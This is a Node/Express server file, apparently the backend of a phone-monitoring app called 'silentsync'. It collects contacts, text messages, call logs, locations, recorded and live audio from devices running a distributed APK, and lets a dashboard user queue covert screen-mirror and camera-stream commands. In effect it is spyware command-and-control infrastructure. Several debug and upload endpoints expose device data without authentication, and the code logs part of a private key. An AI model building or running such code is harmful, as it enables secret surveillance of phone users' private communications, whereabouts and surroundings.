import express from "express";
import cors from "cors";
import path from "path";
import fs from "fs";
import { fileURLToPath } from "url";
import admin from "firebase-admin";
import { getFirestore } from "firebase-admin/firestore";
import dotenv from "dotenv";
import { WebSocketServer, WebSocket } from "ws";

// Load environment variables from .env file
dotenv.config();

// Helper for filesystem paths (local only)
// Check specifically for Cloudflare Workers (not Render)
const isCloudflareWorker =
  typeof (globalThis as any).WebSocketPair !== "undefined";
let __filename: string, __dirname: string;

if (!isCloudflareWorker) {
  __filename = fileURLToPath(import.meta.url);
  __dirname = path.dirname(__filename);
}

// Initialize Firebase Admin
const getFirebaseConfig = () => {
  const config = process.env.FIREBASE_CONFIG;
  if (config) {
    try {
      return JSON.parse(config);
    } catch (e) {
      console.error("Failed to parse FIREBASE_CONFIG from env:", e);
    }
  }
  // Try to read from local file (development only)
  if (!isCloudflareWorker) {
    try {
      return JSON.parse(
        fs.readFileSync(path.join(__dirname, "firebase-config.json"), "utf8"),
      );
    } catch (e) {
      console.warn("firebase-config.json not found, using env vars only");
    }
  }
  return {};
};

const getServiceAccount = () => {
  const sa = process.env.FIREBASE_SERVICE_ACCOUNT;
  if (sa) {
    try {
      const parsed = JSON.parse(sa);
      if (parsed.private_key) {
        parsed.private_key = parsed.private_key.replace(/\\n/g, "\n");
      }
      return parsed;
    } catch (e) {
      console.error("Failed to parse FIREBASE_SERVICE_ACCOUNT from env:", e);
    }
  }
  // Try to read from local file (development only)
  if (!isCloudflareWorker) {
    try {
      const files = fs.readdirSync(__dirname);
      const serviceAccountFile = files.find(
        (f) => f.includes("firebase-adminsdk") && f.endsWith(".json"),
      );
      if (serviceAccountFile) {
        console.log(
          `[Firebase] Found service account file: ${serviceAccountFile}`,
        );
        const parsed = JSON.parse(
          fs.readFileSync(path.join(__dirname, serviceAccountFile), "utf8"),
        );
        console.log(
          `[Firebase] Parsed service account, has private_key: ${!!parsed.private_key}`,
        );
        console.log(
          `[Firebase] Loaded service account from ${serviceAccountFile}`,
        );
        return parsed;
      } else {
        console.log("[Firebase] No service account file found in directory");
      }
    } catch (e) {
      console.warn("[Firebase] Error loading service account file:", e);
    }
  }
  return null;
};

// Initialize Firebase
console.log("[Firebase] Starting initialization...");
if (admin.apps.length === 0) {
  const serviceAccount = getServiceAccount();
  const firebaseConfig = getFirebaseConfig();

  console.log(`[Firebase] Service account loaded: ${!!serviceAccount}`);
  if (serviceAccount) {
    console.log(`[Firebase] Project ID: ${serviceAccount.project_id}`);
    console.log(`[Firebase] Client email: ${serviceAccount.client_email}`);
    console.log(
      `[Firebase] Private key length: ${serviceAccount.private_key?.length || 0}`,
    );
    console.log(
      `[Firebase] Private key starts with: ${serviceAccount.private_key?.substring(0, 30)}`,
    );

    try {
      admin.initializeApp({
        credential: admin.credential.cert(serviceAccount),
        projectId: firebaseConfig.projectId || serviceAccount.project_id,
      });
      console.log("Firebase Admin initialized successfully");
    } catch (initError) {
      console.error("[Firebase] Initialization error:", initError);
      throw initError;
    }
  } else {
    console.error(
      "Firebase Service Account not found in environment or local files.",
    );
    console.error("Please set FIREBASE_SERVICE_ACCOUNT environment variable.");
  }
}

const db = getFirestore();
const app = express();

// CORS configuration
const corsOrigins = process.env.CORS_ORIGINS
  ? process.env.CORS_ORIGINS.split(",").map((o) => o.trim())
  : [
      "http://localhost:3000",
      "http://localhost:5173",
      "http://127.0.0.1:3000",
      "*",
    ];

app.use(
  cors({
    origin: corsOrigins,
    credentials: true,
  }),
);
app.use(express.json({ limit: process.env.MAX_FILE_SIZE || "50mb" }));

// Request Logger
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  next();
});

// Health check endpoint
app.get("/health", (req, res) => {
  res.json({
    status: "healthy",
    timestamp: new Date().toISOString(),
    environment: isCloudflareWorker ? "cloudflare-worker" : "node",
  });
});

// Authentication Middleware
const authenticate = async (req: any, res: any, next: any) => {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith("Bearer ")) {
    return res.status(401).json({ error: "Unauthorized: Missing token" });
  }

  const token = authHeader.split(" ")[1];
  try {
    const decodedToken = await admin.auth().verifyIdToken(token);
    req.user = decodedToken;
    next();
  } catch (error) {
    console.error("Token verification failed:", error);
    res.status(401).json({ error: "Unauthorized: Invalid token" });
  }
};

// Debug: confirm which Firebase project this backend is writing to
app.get("/api/debug/firebase", (req, res) => {
  try {
    const appInstance = admin.app();
    res.json({
      projectId: appInstance.options.projectId || null,
      serviceAccount: {
        // credential is not exposed, so we rely on startup logs for email;
        // this endpoint is for quick projectId verification only.
        available: true,
      },
    });
  } catch (e: any) {
    res.status(500).json({ error: e?.message || "debug_failed" });
  }
});

// Debug: check whether a device is connected/registered
// Usage:
// - GET /api/debug/device?deviceId=ABC
// - GET /api/debug/device?uniqueId=YOUR_CODE
app.get("/api/debug/device", async (req, res) => {
  try {
    const deviceId =
      typeof req.query.deviceId === "string" ? req.query.deviceId : "";
    const uniqueId =
      typeof req.query.uniqueId === "string" ? req.query.uniqueId : "";

    if (!deviceId && !uniqueId) {
      return res
        .status(400)
        .json({ error: "Provide deviceId or uniqueId query param" });
    }

    if (deviceId) {
      const docSnap = await db.collection("devices").doc(deviceId).get();
      return res.json({
        found: docSnap.exists,
        deviceId,
        data: docSnap.exists ? docSnap.data() : null,
      });
    }

    const snap = await db
      .collection("devices")
      .where("uniqueId", "==", uniqueId)
      .limit(10)
      .get();

    const devices = snap.docs.map((d) => ({ id: d.id, ...d.data() }));
    return res.json({
      found: devices.length > 0,
      uniqueId,
      count: devices.length,
      devices,
    });
  } catch (e: any) {
    res.status(500).json({ error: e?.message || "debug_failed" });
  }
});

// Debug: list latest commands for a device
// Usage: GET /api/debug/commands?deviceId=ABC&limit=20
app.get("/api/debug/commands", async (req, res) => {
  try {
    const deviceId =
      typeof req.query.deviceId === "string" ? req.query.deviceId : "";
    const limitRaw =
      typeof req.query.limit === "string" ? parseInt(req.query.limit, 10) : 20;
    const limit = Number.isFinite(limitRaw)
      ? Math.min(Math.max(limitRaw, 1), 100)
      : 20;

    if (!deviceId) {
      return res.status(400).json({ error: "Provide deviceId query param" });
    }

    const snap = await db
      .collection("devices")
      .doc(deviceId)
      .collection("commands")
      .orderBy("createdAt", "desc")
      .limit(limit)
      .get();

    const commands = snap.docs.map((d) => ({ id: d.id, ...d.data() }));
    res.json({ deviceId, count: commands.length, commands });
  } catch (e: any) {
    res.status(500).json({ error: e?.message || "debug_failed" });
  }
});

// --- API Routes ---

// Register Device
app.post("/api/register-device", async (req, res) => {
  const { deviceId, deviceName, ownerUid, uniqueId, userId } = req.body;
  if (!deviceId) return res.status(400).json({ error: "deviceId is required" });

  try {
    // If a uniqueId is provided (referral code), link the device to the dashboard
    // user who created/owns that uniqueId.
    let resolvedOwnerUid = ownerUid;
    if (uniqueId) {
      const ownerSnap = await db
        .collection("userApkRegistrations")
        .where("uniqueId", "==", uniqueId)
        .limit(1)
        .get();

      if (!ownerSnap.empty) {
        const owner = ownerSnap.docs[0].data();
        if (owner?.userId) {
          resolvedOwnerUid = owner.userId;
        }
      }
    }

    if (!resolvedOwnerUid) {
      return res
        .status(400)
        .json({ error: "ownerUid is required (or provide uniqueId)" });
    }

    const deviceRef = db.collection("devices").doc(deviceId);
    await deviceRef.set(
      {
        deviceId,
        deviceName: deviceName || `Device ${deviceId.substr(0, 4)}`,
        registeredAt: admin.firestore.FieldValue.serverTimestamp(),
        lastSyncAt: admin.firestore.FieldValue.serverTimestamp(),
        lastConnectionAt: admin.firestore.FieldValue.serverTimestamp(),
        status: "active",
        isOnline: true,
        isPublic: false, // Devices are private by default
        ownerUid: resolvedOwnerUid,
        ...(uniqueId ? { uniqueId } : {}),
        ...(userId ? { userId } : {}),
      },
      { merge: true },
    );

    console.log(`[Registration] Device registered: ${deviceId}`);
    res.json({
      success: true,
      message: "Device linked successfully",
      deviceId,
    });
  } catch (error) {
    console.error("Registration error:", error);
    res.status(500).json({ error: "Failed to link device" });
  }
});

// Upload Data (contacts, messages, call logs, apps, stats, locations)
app.post("/api/upload/:deviceId", async (req, res) => {
  const { deviceId } = req.params;
  const { type, data, uniqueId } = req.body;

  if (!deviceId || !type || !data) {
    return res
      .status(400)
      .json({ error: "Missing required fields: deviceId, type, data" });
  }

  try {
    const deviceRef = db.collection("devices").doc(deviceId);

    // Update last sync time and online status
    await deviceRef.set(
      {
        lastSyncAt: admin.firestore.FieldValue.serverTimestamp(),
        lastConnectionAt: admin.firestore.FieldValue.serverTimestamp(),
        status: "active",
        isOnline: true,
        ...(uniqueId ? { uniqueId } : {}),
      },
      { merge: true },
    );

    const collectionName = type === "call_logs" ? "call_logs" : type;

    // Handle system stats specially
    if (type === "system_stats") {
      await deviceRef.set({ stats: data }, { merge: true });
      console.log(`[Upload] System stats updated for ${deviceId}`);
      return res.json({ success: true, type: "system_stats" });
    }

    const subColRef = deviceRef.collection(collectionName);

    if (Array.isArray(data)) {
      const batch = db.batch();
      data.forEach((item: any) => {
        let docId: string | undefined;

        // Generate unique document IDs for deduplication
        if (type === "call_logs" && item.timestamp && item.phoneNumber) {
          const phoneNumber =
            typeof item.phoneNumber === "string"
              ? item.phoneNumber
              : String(item.phoneNumber);
          docId = `${item.timestamp}_${phoneNumber.replace(/[^0-9]/g, "")}`;
        } else if (type === "messages" && item.date && item.address) {
          const address =
            typeof item.address === "string"
              ? item.address
              : String(item.address);
          docId = `${item.date}_${address.replace(/[^0-9]/g, "")}`;
        } else if (type === "contacts" && item.displayName) {
          const phone =
            item.phoneNumbers?.[0]?.number || item.phoneNumbers?.[0] || "";
          const phoneNumber = typeof phone === "string" ? phone : String(phone);
          docId = `${item.displayName.replace(/\s/g, "_")}_${phoneNumber.replace(/[^0-9]/g, "")}`;
        } else if (type === "apps" && item.packageName) {
          docId = item.packageName.replace(/\./g, "_");
        } else if (type === "locations" && item.timestamp) {
          docId = `${item.timestamp}_${Math.random().toString(36).substr(2, 5)}`;
        }

        const docRef = docId ? subColRef.doc(docId) : subColRef.doc();
        batch.set(
          docRef,
          {
            ...item,
            syncedAt: admin.firestore.FieldValue.serverTimestamp(),
          },
          { merge: true },
        );
      });

      await batch.commit();
      console.log(`[Upload] ${data.length} ${type} uploaded for ${deviceId}`);
    } else {
      await subColRef.add({
        ...data,
        syncedAt: admin.firestore.FieldValue.serverTimestamp(),
      });
      console.log(`[Upload] Single ${type} uploaded for ${deviceId}`);
    }

    res.json({ success: true, count: Array.isArray(data) ? data.length : 1 });
  } catch (error) {
    console.error("Upload error:", error);
    res
      .status(500)
      .json({ error: "Failed to upload data", details: String(error) });
  }
});

// Dedicated Location Endpoint
app.post("/api/location/:deviceId", async (req, res) => {
  const { deviceId } = req.params;
  const { latitude, longitude, accuracy, timestamp } = req.body;

  if (!deviceId || latitude === undefined || longitude === undefined) {
    return res.status(400).json({
      error: "Missing required fields: deviceId, latitude, longitude",
    });
  }

  try {
    const deviceRef = db.collection("devices").doc(deviceId);

    await deviceRef.collection("locations").add({
      latitude,
      longitude,
      accuracy: accuracy || null,
      timestamp: timestamp
        ? new Date(timestamp)
        : admin.firestore.FieldValue.serverTimestamp(),
      syncedAt: admin.firestore.FieldValue.serverTimestamp(),
    });

    await deviceRef.set(
      {
        lastSyncAt: admin.firestore.FieldValue.serverTimestamp(),
        lastConnectionAt: admin.firestore.FieldValue.serverTimestamp(),
        status: "active",
        isOnline: true,
      },
      { merge: true },
    );

    console.log(
      `[Location] Updated for ${deviceId}: ${latitude}, ${longitude}`,
    );
    res.json({ success: true });
  } catch (error) {
    console.error("Location update error:", error);
    res.status(500).json({ error: "Failed to update location" });
  }
});

// Send Command (from Dashboard to Device) - Authenticated
app.post("/api/command/:deviceId", authenticate, async (req: any, res) => {
  const { deviceId } = req.params;
  const { type, payload, message } = req.body;
  const userId = req.user.uid;

  if (!deviceId || !type) {
    return res.status(400).json({ error: "Missing deviceId or type" });
  }

  try {
    const deviceRef = db.collection("devices").doc(deviceId);
    const deviceSnap = await deviceRef.get();

    if (!deviceSnap.exists || deviceSnap.data()?.ownerUid !== userId) {
      return res
        .status(403)
        .json({ error: "Forbidden: You do not own this device" });
    }

    const commandRef = deviceRef.collection("commands").doc();

    const commandData: any = {
      type,
      status: "pending",
      createdAt: admin.firestore.FieldValue.serverTimestamp(),
    };

    if (payload) commandData.payload = payload;
    if (message) commandData.payload = { message };

    // Handle screen_mirror command
    if (type === "screen_mirror") {
      const streamUrl = `wss://silentsync-backend.onrender.com/screen-stream?deviceId=${deviceId}`;
      commandData.payload = { streamUrl };
      console.log(`[Command] Screen mirror payload:`, commandData.payload);
      console.log(
        `[Command] Screen mirror requested for ${deviceId}, streamUrl: ${streamUrl}`,
      );
      await commandRef.set(commandData);
      return res.json({ success: true, streamUrl, commandId: commandRef.id });
    }

    // Handle camera_capture command
    if (type === "camera_capture") {
      // Use WebSocket URL based on environment
      const protocol = req.secure || isCloudflareWorker ? "wss" : "ws";
      const host = isCloudflareWorker
        ? "silentsync-backend.onrender.com"
        : req.headers.host;
      const streamUrl = `${protocol}://${host}/camera-stream?deviceId=${deviceId}`;
      const cameraType = payload?.camera || "back";
      commandData.payload = { streamUrl, camera: cameraType };
      console.log(`[Command] Camera capture payload:`, commandData.payload);
      console.log(
        `[Command] Camera capture requested for ${deviceId} (${cameraType} camera), streamUrl: ${streamUrl}`,
      );
      await commandRef.set(commandData);
      return res.json({
        success: true,
        streamUrl,
        commandId: commandRef.id,
        camera: cameraType,
      });
    }

    // Include message if provided (for display_message command)
    if (message) {
      commandData.message = message;
    }

    await commandRef.set(commandData);

    console.log(`[Command] Sent to ${deviceId}: ${type}`);
    res.json({ success: true, commandId: commandRef.id });
  } catch (error) {
    console.error("Command error:", error);
    res.status(500).json({ error: "Failed to send command" });
  }
});

// Fetch Pending Commands (Device polls this)
app.get("/api/commands/:deviceId", async (req, res) => {
  const { deviceId } = req.params;

  try {
    const commandsRef = db
      .collection("devices")
      .doc(deviceId)
      .collection("commands");
    const snapshot = await commandsRef.where("status", "==", "pending").get();

    // Spread document data first so the real Firestore document id always wins
    // (some clients may store an `id` field that would otherwise overwrite doc.id).
    const commands = snapshot.docs.map((doc) => ({
      ...doc.data(),
      id: doc.id,
    }));

    // Mark as "sent" so device doesn't get them again
    if (commands.length > 0) {
      const batch = db.batch();
      snapshot.docs.forEach((doc) => {
        batch.update(doc.ref, { status: "sent" });
      });
      await batch.commit();
      console.log(
        `[Commands] ${commands.length} commands fetched for ${deviceId}`,
      );
    }

    res.json({ commands });
  } catch (error) {
    console.error("Fetch commands error:", error);
    res.status(500).json({ error: "Failed to fetch commands" });
  }
});

// Update Command Status (Device reports execution result)
app.post("/api/command/:deviceId/:commandId/status", async (req, res) => {
  const { deviceId, commandId } = req.params;
  const { status, result } = req.body;

  if (!status || !["executed", "failed", "sent", "pending"].includes(status)) {
    return res.status(400).json({
      error: "Invalid status. Must be: executed, failed, sent, or pending",
    });
  }

  try {
    const commandRef = db
      .collection("devices")
      .doc(deviceId)
      .collection("commands")
      .doc(commandId);
    await commandRef.update({
      status,
      result: result || {},
      executedAt: admin.firestore.FieldValue.serverTimestamp(),
    });

    console.log(
      `[Command] Status updated for ${deviceId}/${commandId}: ${status}`,
    );
    res.json({ success: true });
  } catch (error) {
    console.error("Update command status error:", error);
    res.status(500).json({ error: "Failed to update command status" });
  }
});

// Handle Audio Uploads
app.post("/api/upload-audio/:deviceId", async (req, res) => {
  const { deviceId } = req.params;
  const { audio } = req.body;

  if (!deviceId || !audio) {
    return res
      .status(400)
      .json({ error: "Missing required fields: deviceId, audio" });
  }

  // Cloudflare Worker mode: return error (use R2 for production)
  if (isCloudflareWorker) {
    return res.status(501).json({
      error:
        "Audio storage requires Cloudflare R2 or external storage on this platform. " +
        "Please configure R2 bucket or use a Node.js host for local disk storage.",
    });
  }

  try {
    const uploadsDir = path.join(__dirname, "public", "uploads");
    if (!fs.existsSync(uploadsDir)) {
      fs.mkdirSync(uploadsDir, { recursive: true });
    }

    const buffer = Buffer.from(audio, "base64");
    const localFileName = `audio_${deviceId}_${Date.now()}.m4a`;
    const filePath = path.join(uploadsDir, localFileName);

    fs.writeFileSync(filePath, buffer);

    const publicUrl = `/uploads/${localFileName}`;

    // Try to save to Firestore, but don't fail if it doesn't work
    try {
      const audioId = localFileName.replace(/\./g, "_");
      await db
        .collection("devices")
        .doc(deviceId)
        .collection("audio")
        .doc(audioId)
        .set(
          {
            fileName: localFileName,
            url: publicUrl,
            syncedAt: admin.firestore.FieldValue.serverTimestamp(),
          },
          { merge: true },
        );
      console.log(`[Audio] Uploaded for ${deviceId}: ${localFileName}`);
    } catch (firestoreError) {
      console.error(
        "[Audio] Firestore save failed, but file saved:",
        firestoreError,
      );
      // Continue anyway - the file is saved
    }

    res.json({ success: true, url: publicUrl, fileName: localFileName });
  } catch (error) {
    console.error("Audio upload error:", error);
    res.status(500).json({ error: "Failed to save audio" });
  }
});

// Fetch audio files for a device - Authenticated
app.get("/api/audio/:deviceId", authenticate, async (req: any, res) => {
  const { deviceId } = req.params;
  const userId = req.user.uid;

  try {
    const deviceSnap = await db.collection("devices").doc(deviceId).get();
    if (!deviceSnap.exists || deviceSnap.data()?.ownerUid !== userId) {
      return res
        .status(403)
        .json({ error: "Forbidden: You do not own this device" });
    }

    console.log(`[Audio API] Fetching audio for device: ${deviceId}`);
    const uploadsDir = path.join(__dirname, "public", "uploads");
    if (!fs.existsSync(uploadsDir)) {
      console.log(`[Audio API] Uploads directory not found`);
      return res.json([]);
    }

    const files = fs.readdirSync(uploadsDir);
    console.log(`[Audio API] Found ${files.length} files in uploads directory`);
    const audioFiles = files
      .filter(
        (file) =>
          file.startsWith(`audio_${deviceId}_`) && file.endsWith(".m4a"),
      )
      .map((file) => ({
        id: file.replace(/\./g, "_"),
        fileName: file,
        url: `/uploads/${file}`,
        syncedAt: fs.statSync(path.join(uploadsDir, file)).mtime,
      }))
      .sort((a, b) => b.syncedAt - a.syncedAt);

    console.log(`[Audio API] Returning ${audioFiles.length} audio files`);
    res.json(audioFiles);
  } catch (error) {
    console.error("Fetch audio error:", error);
    res.status(500).json({ error: "Failed to fetch audio files" });
  }
});

// Get all devices (Authenticated & Filtered by ownerUid)
app.get("/api/devices", authenticate, async (req: any, res) => {
  try {
    const userId = req.user.uid;
    const snapshot = await db
      .collection("devices")
      .where("ownerUid", "==", userId)
      .get();
    const devices = snapshot.docs.map((doc) => ({
      id: doc.id,
      ...doc.data(),
    }));
    res.json({ success: true, devices });
  } catch (error) {
    console.error("Error fetching devices:", error);
    res.status(500).json({ success: false, error: "Failed to fetch devices" });
  }
});

// Get devices by identifier (Authenticated & Filtered)
app.get("/api/devices/:identifier", authenticate, async (req: any, res) => {
  try {
    const { identifier } = req.params;
    const userId = req.user.uid;

    if (!identifier) {
      return res
        .status(400)
        .json({ success: false, error: "identifier is required" });
    }

    // Security Check: User can only fetch their own devices or by their own uniqueId
    // If identifier is not their UID, check if it's their uniqueId
    let isAuthorized = identifier === userId;

    if (!isAuthorized) {
      const userApkSnap = await db
        .collection("userApkRegistrations")
        .where("userId", "==", userId)
        .where("uniqueId", "==", identifier)
        .limit(1)
        .get();

      if (!userApkSnap.empty) {
        isAuthorized = true;
      }
    }

    if (!isAuthorized) {
      return res.status(403).json({
        success: false,
        error: "Forbidden: Access denied to this identifier",
      });
    }

    console.log(`[Devices API] Fetching devices for identifier: ${identifier}`);

    // Query 1: by ownerUid (Dashboard owner)
    const ownerQuery = db
      .collection("devices")
      .where("ownerUid", "==", identifier)
      .get();

    // Query 2: by uniqueId (Referral code)
    const uniqueIdQuery = db
      .collection("devices")
      .where("uniqueId", "==", identifier)
      .get();

    const [ownerSnap, uniqueSnap] = await Promise.all([
      ownerQuery,
      uniqueIdQuery,
    ]);

    const deviceMap = new Map();

    const addDocs = (snap: admin.firestore.QuerySnapshot) => {
      snap.docs.forEach((doc) => {
        const data = doc.data();
        deviceMap.set(doc.id, { id: doc.id, ...data });
      });
    };

    addDocs(ownerSnap);
    addDocs(uniqueSnap);

    const devices = Array.from(deviceMap.values());
    console.log(
      `[Devices API] Found ${devices.length} devices for ${identifier}`,
    );

    res.json({ success: true, devices });
  } catch (error) {
    console.error("Error fetching devices by identifier:", error);
    res.status(500).json({ success: false, error: "Failed to fetch devices" });
  }
});

// Register APK with unique ID
app.post("/api/register-apk", async (req, res) => {
  const { uniqueId, apkUrl } = req.body;
  if (!uniqueId || !apkUrl) {
    return res.status(400).json({ error: "uniqueId and apkUrl are required" });
  }

  try {
    // Store the APK registration
    await db.collection("apkRegistrations").doc(uniqueId).set({
      uniqueId,
      apkUrl,
      createdAt: admin.firestore.FieldValue.serverTimestamp(),
      status: "active",
    });

    console.log(`[APK Registration] Unique ID: ${uniqueId}, APK: ${apkUrl}`);
    res.json({
      success: true,
      message: "APK registered successfully",
      uniqueId,
      apkUrl,
    });
  } catch (error) {
    console.error("APK registration error:", error);
    res.status(500).json({ error: "Failed to register APK" });
  }
});

// Check if unique ID is available
app.get("/api/check-unique-id/:uniqueId", async (req, res) => {
  const { uniqueId } = req.params;
  if (!uniqueId) {
    return res.status(400).json({ error: "uniqueId is required" });
  }

  try {
    console.log(`[Unique ID Check] Checking availability for: ${uniqueId}`);

    // Check if unique ID exists in APK registrations
    const apkDoc = await db.collection("apkRegistrations").doc(uniqueId).get();

    // Check if unique ID exists in per-user APK registrations (dashboard flow)
    const userApkByUniqueIdSnapshot = await db
      .collection("userApkRegistrations")
      .where("uniqueId", "==", uniqueId)
      .limit(1)
      .get();

    // Also check if any device is already using this unique ID
    const deviceSnapshot = await db
      .collection("devices")
      .where("userId", "==", uniqueId)
      .get();

    const deviceWithSameId = deviceSnapshot.docs.find((doc) => doc.exists);

    const userApkWithSameId = !userApkByUniqueIdSnapshot.empty;

    if (apkDoc.exists || userApkWithSameId || deviceWithSameId) {
      console.log(`[Unique ID Check] ID ${uniqueId} already exists`);
      const conflictSource = apkDoc.exists
        ? "APK registration"
        : userApkWithSameId
          ? "User APK registration"
          : "Device registration";
      console.log(`[Unique ID Check] Conflict source: ${conflictSource}`);

      const resolvedOwnerUid = userApkWithSameId
        ? userApkByUniqueIdSnapshot.docs[0].data()?.userId || null
        : null;

      res.json({
        success: true,
        available: false,
        exists: true,
        message: `Unique ID is already taken. It's already used in ${conflictSource}.`,
        conflictSource,
        ownerUid: resolvedOwnerUid,
      });
    } else {
      console.log(
        `[Unique ID Check] ID ${uniqueId} is available for APK registration`,
      );
      res.json({
        success: true,
        available: true,
        exists: false,
        message: "Unique ID is available",
      });
    }
  } catch (error) {
    console.error("Check unique ID error:", error);
    res
      .status(500)
      .json({ success: false, error: "Failed to check unique ID" });
  }
});

// Check if user already has an APK (by userId or uniqueId) - Authenticated
app.get("/api/user-apk/:identifier", authenticate, async (req: any, res) => {
  const { identifier } = req.params;
  const userId = req.user.uid;

  if (!identifier) {
    return res.status(400).json({ error: "identifier is required" });
  }

  // Security Check: User can only check their own APK status
  if (identifier !== userId) {
    // If identifier is not their UID, check if it's their uniqueId
    const userApkSnap = await db
      .collection("userApkRegistrations")
      .where("userId", "==", userId)
      .where("uniqueId", "==", identifier)
      .limit(1)
      .get();

    if (userApkSnap.empty) {
      return res.status(403).json({ success: false, error: "Forbidden" });
    }
  }

  try {
    console.log(`[User APK Check] Checking APK for: ${identifier}`);

    // Check by userId
    const userQuery = db
      .collection("userApkRegistrations")
      .where("userId", "==", identifier)
      .get();

    // Check by uniqueId
    const uniqueQuery = db
      .collection("userApkRegistrations")
      .where("uniqueId", "==", identifier)
      .get();

    const [userSnap, uniqueSnap] = await Promise.all([userQuery, uniqueQuery]);

    let userApkDoc = !userSnap.empty
      ? userSnap.docs[0]
      : !uniqueSnap.empty
        ? uniqueSnap.docs[0]
        : null;

    if (userApkDoc) {
      const userApk = userApkDoc.data();
      console.log(`[User APK Check] Found APK: ${userApk.apkUrl}`);
      res.json({
        success: true,
        hasApk: true,
        apkUrl: userApk.apkUrl,
        uniqueId: userApk.uniqueId,
        createdAt: userApk.createdAt,
      });
    } else {
      console.log(`[User APK Check] No APK found for ${identifier}`);
      res.json({ success: true, hasApk: false });
    }
  } catch (error) {
    console.error("User APK check error:", error);
    res.status(500).json({ success: false, error: "Failed to check user APK" });
  }
});

// Register APK for specific user (one-ID-per-user system) - Authenticated
app.post("/api/register-user-apk", authenticate, async (req: any, res) => {
  const { uniqueId, apkUrl } = req.body;
  const userId = req.user.uid;

  if (!uniqueId || !apkUrl) {
    return res.status(400).json({ error: "uniqueId and apkUrl are required" });
  }

  try {
    console.log(
      `[User APK Registration] Registering APK for user: ${userId}, ID: ${uniqueId}`,
    );

    // First check if user already has an APK
    const existingApkSnapshot = await db
      .collection("userApkRegistrations")
      .where("userId", "==", userId)
      .get();

    if (!existingApkSnapshot.empty) {
      return res.status(400).json({
        error:
          "User already has an APK registered. Only one APK per user is allowed.",
      });
    }

    // Also check if uniqueId is already taken by ANYONE
    const conflictSnap = await db
      .collection("userApkRegistrations")
      .where("uniqueId", "==", uniqueId)
      .limit(1)
      .get();

    if (!conflictSnap.empty) {
      return res.status(409).json({
        error: "This Unique ID is already taken. Please choose another one.",
      });
    }

    // Register the APK for this user
    await db.collection("userApkRegistrations").add({
      userId,
      uniqueId,
      apkUrl,
      createdAt: admin.firestore.FieldValue.serverTimestamp(),
      status: "active",
    });

    console.log(
      `[User APK Registration] Successfully registered APK for user ${userId}`,
    );
    res.json({
      success: true,
      message: "APK registered successfully for user",
      userId,
      uniqueId,
      apkUrl,
    });
  } catch (error) {
    console.error("User APK registration error:", error);
    res.status(500).json({ error: "Failed to register user APK" });
  }
});

// Live Audio (HTTP fallback): store and serve latest short audio segment
app.post("/api/live-audio/:deviceId", async (req, res) => {
  const { deviceId } = req.params;
  const { base64, segmentId } = req.body;

  if (!deviceId || !base64) {
    return res.status(400).json({ error: "deviceId and base64 are required" });
  }

  if (isCloudflareWorker) {
    return res
      .status(501)
      .json({ error: "Not supported on Cloudflare Worker" });
  }

  try {
    const uploadsDir = path.join(__dirname, "public", "uploads");
    if (!fs.existsSync(uploadsDir)) {
      fs.mkdirSync(uploadsDir, { recursive: true });
    }

    const buffer = Buffer.from(base64, "base64");
    const segId = String(segmentId || Date.now());
    const segmentFileName = `audio_stream_${deviceId}_${segId}.m4a`;
    const segmentPath = path.join(uploadsDir, segmentFileName);
    fs.writeFileSync(segmentPath, buffer);

    // Backward compatibility: also write/overwrite latest
    const latestFileName = `audio_stream_latest_${deviceId}.m4a`;
    const latestPath = path.join(uploadsDir, latestFileName);
    fs.writeFileSync(latestPath, buffer);

    // Keep last 30 segments per device to allow continuous playback
    const segmentPrefix = `audio_stream_${deviceId}_`;
    const segmentFiles = fs
      .readdirSync(uploadsDir)
      .filter((f) => f.startsWith(segmentPrefix) && f.endsWith(".m4a"))
      .map((f) => ({
        file: f,
        mtimeMs: fs.statSync(path.join(uploadsDir, f)).mtimeMs,
      }))
      .sort((a, b) => b.mtimeMs - a.mtimeMs);

    for (const old of segmentFiles.slice(30)) {
      try {
        fs.unlinkSync(path.join(uploadsDir, old.file));
      } catch {
        // ignore
      }
    }

    const publicUrl = `/uploads/${segmentFileName}`;

    // Touch online status
    await db.collection("devices").doc(deviceId).set(
      {
        lastConnectionAt: admin.firestore.FieldValue.serverTimestamp(),
        status: "active",
        isOnline: true,
      },
      { merge: true },
    );

    res.json({
      success: true,
      url: publicUrl,
      segmentId: segId,
      updatedAt: new Date().toISOString(),
    });
  } catch (error) {
    console.error("Live audio upload error:", error);
    res.status(500).json({ error: "Failed to upload live audio" });
  }
});

app.get("/api/live-audio/:deviceId", async (req, res) => {
  const { deviceId } = req.params;
  const after = typeof req.query.after === "string" ? req.query.after : null;
  if (!deviceId) return res.status(400).json({ error: "deviceId is required" });
  if (isCloudflareWorker) return res.json({ exists: false });

  try {
    const uploadsDir = path.join(__dirname, "public", "uploads");
    const segmentPrefix = `audio_stream_${deviceId}_`;
    if (!fs.existsSync(uploadsDir)) return res.json({ exists: false });

    const allSegments = fs
      .readdirSync(uploadsDir)
      .filter((f) => f.startsWith(segmentPrefix) && f.endsWith(".m4a"))
      .map((file) => {
        const segId = file.replace(segmentPrefix, "").replace(/\.m4a$/, "");
        const stat = fs.statSync(path.join(uploadsDir, file));
        return {
          segmentId: segId,
          url: `/uploads/${file}`,
          updatedAt: stat.mtime.toISOString(),
          size: stat.size,
        };
      })
      .sort((a, b) => Number(a.segmentId) - Number(b.segmentId));

    const segments = after
      ? allSegments.filter((s) => Number(s.segmentId) > Number(after))
      : allSegments.slice(-5);

    if (segments.length === 0) {
      // Fall back to latest file existence check
      const latestFileName = `audio_stream_latest_${deviceId}.m4a`;
      const latestPath = path.join(uploadsDir, latestFileName);
      if (!fs.existsSync(latestPath)) return res.json({ exists: false });
      const stat = fs.statSync(latestPath);
      return res.json({
        exists: true,
        url: `/uploads/${latestFileName}`,
        updatedAt: stat.mtime.toISOString(),
        size: stat.size,
        segments: [],
      });
    }

    return res.json({
      exists: true,
      segments,
      latestSegmentId: segments[segments.length - 1]?.segmentId || null,
    });
  } catch (error) {
    console.error("Live audio fetch error:", error);
    res.status(500).json({ error: "Failed to fetch live audio" });
  }
});

// WebRTC Signaling for gapless audio streaming
app.post("/api/webrtc/offer", async (req, res) => {
  const { deviceId, offer } = req.body;
  if (!deviceId || !offer) {
    return res.status(400).json({ error: "deviceId and offer are required" });
  }
  try {
    await db.collection("webrtcSessions").doc(deviceId).set(
      {
        offer,
        offerCreatedAt: admin.firestore.FieldValue.serverTimestamp(),
      },
      { merge: true },
    );
    res.json({ success: true });
  } catch (error) {
    console.error("WebRTC offer error:", error);
    res.status(500).json({ error: "Failed to store offer" });
  }
});

